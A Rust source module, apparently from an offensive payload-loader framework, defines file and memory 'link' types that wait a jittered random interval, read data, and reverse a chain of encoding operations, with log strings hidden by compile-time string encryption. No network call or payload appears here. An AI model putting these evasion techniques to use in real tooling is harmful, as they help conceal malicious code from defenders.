
use crate::link::MemoryLink;
use crate::link::FileLink;
use crate::link_util::read_file;
use crate::memory::access_memory;
use crate::dataoperation::DataOperation;
use crate::dataoperation::UnApplyDataOperation;

use std::time;
use rand::Rng;
use std::thread;
use serde::{Deserialize, Serialize};

use cryptify::encrypt_string;
use log::info;

#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub enum LinkNoConfig {
    FILE(FileLink),
    MEMORY(MemoryLink),
}

pub trait LinkFetchNoConfig {
    fn download_data_noconfig(&self) -> Result<Vec<u8>, anyhow::Error>;
    fn get_target(&self) -> String;
    fn get_dataoperation(&self) -> Vec<DataOperation>;
    fn get_sleep(&self) -> u64;
    fn get_jitt(&self) -> u64;

    fn sleep_and_jitt(&self) {
        let mut rng: rand::prelude::ThreadRng = rand::thread_rng();
        let random_number: f64 = rng.gen();

        let jitt = (self.get_jitt() as f64) * random_number;
        let total_sleep = (self.get_sleep() as f64) + jitt;
        if total_sleep != 0.0 {
            info!("{}{}", encrypt_string!("sleep: "), total_sleep);
        };
        let sleep_time: time::Duration = time::Duration::from_millis((total_sleep * 1000.0) as u64);
        thread::sleep(sleep_time);
    }

    fn un_apply_all_dataoperations(&self, mut data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        for operation in self.get_dataoperation() {
            data = operation.un_apply_one_operation(data)?;
        }
        Ok(data)
    }

    fn fetch_data_noconfig(&self) -> Result<Vec<u8>, anyhow::Error> {
        self.sleep_and_jitt();
        let data: Vec<u8> = self.download_data_noconfig()?;
        self.un_apply_all_dataoperations(data)
    }

}




impl LinkFetchNoConfig for LinkNoConfig {
    fn download_data_noconfig(&self) -> Result<Vec<u8>, anyhow::Error> {
        match &self {
            LinkNoConfig::FILE(link) => link.download_data_noconfig(),
            LinkNoConfig::MEMORY(link) => link.download_data_noconfig(),
        }
    }

    fn get_target(&self) -> String {
        match &self {
            LinkNoConfig::FILE(link) => link.get_target(),
            LinkNoConfig::MEMORY(link) => link.get_target(),
        }
    }
    fn get_dataoperation(&self) -> Vec<DataOperation> {
        match &self {
            LinkNoConfig::FILE(link) => link.get_dataoperation(),
            LinkNoConfig::MEMORY(link) => link.get_dataoperation(),
        }
    }

    fn get_sleep(&self) -> u64 {
        match &self {
            LinkNoConfig::FILE(link) => link.get_sleep(),
            LinkNoConfig::MEMORY(link) => link.get_sleep(),
        }
    }
    fn get_jitt(&self) -> u64 {
        match &self {
            LinkNoConfig::FILE(link) => link.get_jitt(),
            LinkNoConfig::MEMORY(link) => link.get_jitt(),
        }
    }
}




impl LinkFetchNoConfig for FileLink {
    fn download_data_noconfig(&self) -> Result<Vec<u8>, anyhow::Error> {
        read_file(&self.get_target())
    }
    fn get_target(&self) -> String {
        format!("{}", self.file_path)
    }
    fn get_dataoperation(&self) -> Vec<DataOperation> {
        self.dataoperation.to_vec()
    }
    fn get_sleep(&self) -> u64 {
        self.sleep
    }
    fn get_jitt(&self) -> u64 {
        self.jitt
    }
}



impl LinkFetchNoConfig for MemoryLink {
    fn download_data_noconfig(&self) -> Result<Vec<u8>, anyhow::Error> {
        access_memory(self.memory_nb)
    }

    fn get_target(&self) -> String {
        format!("{}{}", encrypt_string!("MEMORY_"), self.memory_nb)
    }
    fn get_dataoperation(&self) -> Vec<DataOperation> {
        self.dataoperation.to_vec()
    }
    fn get_sleep(&self) -> u64 {
        self.sleep
    }
    fn get_jitt(&self) -> u64 {
        self.jitt
    }
   }